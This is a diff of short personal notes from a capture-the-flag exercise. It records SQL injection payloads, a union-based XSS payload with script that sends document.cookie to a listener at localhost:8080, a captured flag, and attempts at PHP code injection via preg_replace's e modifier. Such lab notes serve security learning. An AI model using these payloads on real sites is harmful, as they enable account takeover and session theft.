@@ -1,11 +1,17 @@
 * sql injection
   The query is probably 
-  ~SELECT user from (select * from xxx where user='' AND password='');~
-  ~(' or 1=1 or ')~ but ~(' or ''=')~ cannot
+  ~select * from xxx where (user='' AND password='');~
+  ~(' or 1=1 or ')~ but ~(' or ''=')~ cannot because
   ~( user='' or ''='' and password = xxx )~. AND has higher precedence!
 * XSS
   in the SQL injection before. 
   easily found that one column is 'user' and the other 'password'
   ~(') union select '<img id="test"> <script> var im=document.getElementById("test");im.src="http://localhost:8080/?cookie=" + document.cookie;</script>' as user,2 -- )~
   flag: xss_is_a_little_like_sqli_but_usually_a_lot_more_fun
+* php
+  read about ~preg_replace~. especially the ~e~ modifier
+  guess they might be using ~preg_replace('/(.*)/e','hebrev("${1}")',my_input)~
+  try give it ~[hebrew]'.phpinfo().'[/hebrew]~ failed.
+  Hint from Cheng: have unescaped HTML as well.
+  try ~[hebrew]<?php chr(97) ?>[/hebrew]~. Seems ~<?~ stuff is replaced by html comment.. 
 
